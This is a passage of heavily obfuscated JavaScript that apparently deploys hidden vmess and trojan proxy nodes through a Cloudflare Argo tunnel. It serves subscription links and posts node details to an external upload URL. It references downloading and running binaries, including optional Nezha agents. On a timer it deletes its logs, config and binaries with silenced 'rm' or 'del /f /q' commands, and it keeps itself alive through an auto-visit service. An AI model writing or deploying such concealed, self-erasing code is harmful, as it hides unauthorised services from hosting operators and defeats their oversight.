_0xb91c4={_0x4ccdba:0x15d,_0x51072b:0x1b2,_0xda75ad:0x12b,_0x495936:0x14b,_0x2bf684:0x1a9,_0x21caea:0x118,_0x290570:0x156,_0x554015:0x13a,_0x4eaf98:0x1a9,_0x4bc1e1:0x191,_0x42a3da:0x144,_0x41dc0b:0x129,_0x112f41:0x17e},_0x52f685=await _0x79c8e1(),_0x3f9448=NAME?NAME+'-'+_0x52f685:_0x52f685;return new Promise(_0x5bca05=>{const _0x2e7163={_0x189413:0x1d3,_0x3fc61f:0x1a3};setTimeout(()=>{const _0x55f74d=_0x5242,_0x2d6514={'v':'2','ps':''+_0x3f9448,'add':CFIP,'port':CFPORT,'id':UUID,'aid':'0','scy':_0x55f74d(0x199),'net':'ws','type':_0x55f74d(0x199),'host':_0x5f3f8b,'path':'/vmess-argo?ed=2560','tls':'tls','sni':_0x5f3f8b,'alpn':'','fp':'firefox'},_0x3486e5=_0x55f74d(_0xb91c4._0x4ccdba)+UUID+'@'+CFIP+':'+CFPORT+_0x55f74d(_0xb91c4._0x51072b)+_0x5f3f8b+_0x55f74d(_0xb91c4._0xda75ad)+_0x5f3f8b+_0x55f74d(_0xb91c4._0x495936)+_0x3f9448+'\x0a\x0avmess://'+Buffer[_0x55f74d(_0xb91c4._0x2bf684)](JSON[_0x55f74d(_0xb91c4._0x21caea)](_0x2d6514))[_0x55f74d(_0xb91c4._0x290570)](_0x55f74d(0x191))+_0x55f74d(0x13c)+UUID+'@'+CFIP+':'+CFPORT+'?security=tls&sni='+_0x5f3f8b+_0x55f74d(_0xb91c4._0xda75ad)+_0x5f3f8b+'&path=%2Ftrojan-argo%3Fed%3D2560#'+_0x3f9448+_0x55f74d(0x17d);console[_0x55f74d(_0xb91c4._0x554015)](Buffer[_0x55f74d(_0xb91c4._0x4eaf98)](_0x3486e5)['toString'](_0x55f74d(_0xb91c4._0x4bc1e1))),fs[_0x55f74d(_0xb91c4._0x42a3da)](subPath,Buffer[_0x55f74d(_0xb91c4._0x4eaf98)](_0x3486e5)[_0x55f74d(0x156)](_0x55f74d(_0xb91c4._0x4bc1e1))),console[_0x55f74d(_0xb91c4._0x554015)](FILE_PATH+_0x55f74d(_0xb91c4._0x41dc0b)),uploadNodes(),app[_0x55f74d(_0xb91c4._0x112f41)]('/'+SUB_PATH,(_0x2512a0,_0x3d88c7)=>{const _0x2df6ed=_0x55f74d,_0x1fc86f=Buffer[_0x2df6ed(0x1a9)](_0x3486e5)[_0x2df6ed(0x156)]('base64');_0x3d88c7['set'](_0x2df6ed(0x125),_0x2df6ed(_0x2e7163._0x189413)),_0x3d88c7[_0x2df6ed(_0x2e7163._0x3fc61f)](_0x1fc86f);}),_0x5bca05(_0x3486e5);},0x7d0);});}}async function uploadNodes(){const _0x4267cf={_0x11fe3e:0x16c,_0x41e2c7:0x13a,_0x75f174:0x1b4,_0x2e8d5e:0x17a,_0x3eb800:0x175,_0x2a735a:0x1c2,_0xe64c10:0x13a,_0x25faef:0x1c1},_0x4f8333=_0x36cf95;if(UPLOAD_URL&&PROJECT_URL){const _0x272e99=PROJECT_URL+'/'+SUB_PATH,_0x111f7e={'subscription':[_0x272e99]};try{const _0xb8d234=await axios[_0x4f8333(0x180)](UPLOAD_URL+_0x4f8333(0x1bb),_0x111f7e,{'headers':{'Content-Type':_0x4f8333(_0x4267cf._0x11fe3e)}});return _0xb8d234&&_0xb8d234[_0x4f8333(0x1c2)]===0xc8?(console[_0x4f8333(_0x4267cf._0x41e2c7)](_0x4f8333(_0x4267cf._0x75f174)),_0xb8d234):null;}catch(_0x46b2ea){if(_0x46b2ea['response']){if(_0x46b2ea[_0x4f8333(0x120)][_0x4f8333(0x1c2)]===0x190){}}}}else{if(UPLOAD_URL){if(!fs[_0x4f8333(_0x4267cf._0x2e8d5e)](listPath))return;const _0x41b366=fs[_0x4f8333(0x142)](listPath,_0x4f8333(0x153)),_0x15357c=_0x41b366[_0x4f8333(0x159)]('\x0a')['filter'](_0x51ab7d=>/(vless|vmess|trojan|hysteria2|tuic):\/\//[_0x4f8333(0x1be)](_0x51ab7d));if(_0x15357c[_0x4f8333(_0x4267cf._0x3eb800)]===0x0)return;const _0xb8250d=JSON[_0x4f8333(0x118)]({'nodes':_0x15357c});try{const _0x77f8d1=await axios['post'](UPLOAD_URL+_0x4f8333(0x13b),_0xb8250d,{'headers':{'Content-Type':_0x4f8333(0x16c)}});return _0x77f8d1&&_0x77f8d1[_0x4f8333(_0x4267cf._0x2a735a)]===0xc8?(console[_0x4f8333(_0x4267cf._0xe64c10)](_0x4f8333(_0x4267cf._0x25faef)),_0x77f8d1):null;}catch(_0x131ca4){return null;}}else return;}}function cleanFiles(){const _0x5d16b7={_0x10e8cc:0x181,_0x16f831:0x181,_0x13d57e:0x19d,_0x54cde2:0x1cc,_0x40a9a5:0x14e},_0x23851d={_0x120709:0x1af,_0x39c680:0x13a,_0x347be8:0x14d};setTimeout(()=>{const _0x336d62={_0xf76ef0:0x126,_0x14324f:0x13a,_0x2a7e4:0x14d},_0x34e2db=_0x5242,_0x29a2da=[bootLogPath,configPath,webPath,botPath];if(NEZHA_PORT)_0x29a2da[_0x34e2db(_0x5d16b7._0x10e8cc)](npmPath);else NEZHA_SERVER&&NEZHA_KEY&&_0x29a2da[_0x34e2db(_0x5d16b7._0x16f831)](phpPath);process['platform']===_0x34e2db(_0x5d16b7._0x13d57e)?exec('del\x20/f\x20/q\x20'+_0x29a2da[_0x34e2db(0x14e)]('\x20')+_0x34e2db(0x13d),_0x32337d=>{const _0x160ebe=_0x34e2db;console[_0x160ebe(_0x336d62._0xf76ef0)](),console[_0x160ebe(_0x336d62._0x14324f)](_0x160ebe(0x1af)),console['log'](_0x160ebe(_0x336d62._0x2a7e4));}):exec(_0x34e2db(_0x5d16b7._0x54cde2)+_0x29a2da[_0x34e2db(_0x5d16b7._0x40a9a5)]('\x20')+'\x20>/dev/null\x202>&1',_0xb22d37=>{const _0xf7cf34=_0x34e2db;console[_0xf7cf34(0x126)](),console[_0xf7cf34(0x13a)](_0xf7cf34(_0x23851d._0x120709)),console[_0xf7cf34(_0x23851d._0x39c680)](_0xf7cf34(_0x23851d._0x347be8));});},0x15f90);}cleanFiles();async function AddVisitTask(){const _0x160d47={_0x106565:0x180,_0x82e9f3:0x16c,_0x2be399:0x1c8},_0x529689=_0x36cf95;if(!AUTO_ACCESS||!PROJECT_URL){console[_0x529689(0x13a)](_0x529689(0x1d2));return;}try{const _0x1fa5fb=await axios[_0x529689(_0x160d47._0x106565)](_0x529689(0x128),{'url':PROJECT_URL},{'headers':{'Content-Type':_0x529689(_0x160d47._0x82e9f3)}});return console['log'](_0x529689(_0x160d47._0x2be399)),_0x1fa5fb;}catch(_0x57a4ff){return console['error'](_0x529689(0x173)+_0x57a4ff['message']),null;}}async function startserver(){const _0x484ba2={_0x5bf1d8:0x11d},_0x105eec=_0x36cf95;try{argoType(),deleteNodes(),cleanupOldFiles(),await generateConfig(),await downloadFilesAndRun(),await extractDomains(),await AddVisitTask();}catch(_0xfd4d54){console[_0x105eec(_0x484ba2._0x5bf1d8)](_0x105eec(0x130),_0xfd4d54);}}startserver()[_0x36cf95(0x192)](_0x1c29ec=>{const _0xc0634e=_0x36cf95;console[_0xc0634e(0x11d)](_0xc0634e(0x1b0),_0x1c29ec);}),app[_0x36cf95(0x193)](PORT,()=>console[_0x36cf95(0x13a)](_0x36cf95(0x170)+PORT+'!'));
